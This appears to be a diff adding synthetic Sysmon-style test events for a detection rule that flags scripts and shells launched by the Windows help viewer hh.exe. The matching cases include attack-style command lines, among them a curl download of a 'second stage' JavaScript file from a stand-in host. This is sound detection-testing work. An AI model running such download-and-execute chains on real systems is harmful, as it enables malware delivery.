@@ -1,0 +1,50 @@
+{
+ "_note": "Synthetic sample events for rule testing. Not real telemetry. Fields shown in Sysmon/ECS style.",
+ "should_match": [
+  {
+   "EventID": 1,
+   "ParentImage": "C:\\Windows\\hh.exe",
+   "ParentCommandLine": "\"C:\\Windows\\hh.exe\" C:\\Users\\a.kumar\\Downloads\\Request for Support.chm",
+   "Image": "C:\\Windows\\System32\\cmd.exe",
+   "CommandLine": "cmd /c whoami",
+   "_case": "Help file opening cmd.exe"
+  },
+  {
+   "EventID": 1,
+   "ParentImage": "C:\\Windows\\hh.exe",
+   "Image": "C:\\Windows\\System32\\WScript.exe",
+   "CommandLine": "wscript //e:jscript C:\\Users\\Public\\music.js",
+   "_why": "Help file running a JavaScript file through WScript (case-insensitive)"
+  },
+  {
+   "EventID": 1,
+   "ParentImage": "C:\\Windows\\hh.exe",
+   "Image": "C:\\Windows\\System32\\curl.exe",
+   "CommandLine": "curl -o %TEMP%\\a.js https://example.invalid/a.js",
+   "_why": "Help file downloading a second stage"
+  }
+ ],
+ "should_not_match": [
+  {
+   "EventID": 1,
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "Image": "C:\\Windows\\hh.exe",
+   "CommandLine": "\"C:\\Windows\\hh.exe\" C:\\Program Files\\App\\help.chm",
+   "_why": "opening a help file is normal; only its children matter"
+  },
+  {
+   "EventID": 1,
+   "ParentImage": "C:\\Windows\\hh.exe",
+   "Image": "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+   "CommandLine": "",
+   "_why": "a help file opening a browser link is not a script host or LOLBin"
+  },
+  {
+   "EventID": 1,
+   "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+   "Image": "C:\\Windows\\System32\\cmd.exe",
+   "CommandLine": "cmd /c whoami",
+   "_why": "parent is not hh.exe (covered by the Office rule instead)"
+  }
+ ]
+}
